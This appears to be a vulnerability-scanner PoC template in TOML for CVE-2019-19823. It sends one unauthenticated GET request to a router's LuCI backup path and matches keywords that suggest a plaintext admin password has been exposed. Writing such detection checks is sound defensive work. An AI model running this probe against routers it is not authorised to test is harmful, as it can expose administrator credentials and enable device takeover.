[info]
author = "ave"
description = "验证目标路由器管理界面是否将管理员密码以明文形式存储在可远程访问的文件中，攻击者无需认证即可通过访问特定接口读取明文密码"
id = "POC-AVE-2019-0147"
name = "CVE-2019-19823 PoC"
severity = "high"
tags = ["ave-2019-0147"]
vuln_id = [
    "CVE-2019-19823",
    "AVE-2019-0147",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/cgi-bin/luci/admin/system/backup"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "password",
    "admin",
    "plaintext",
    "pwd",
]
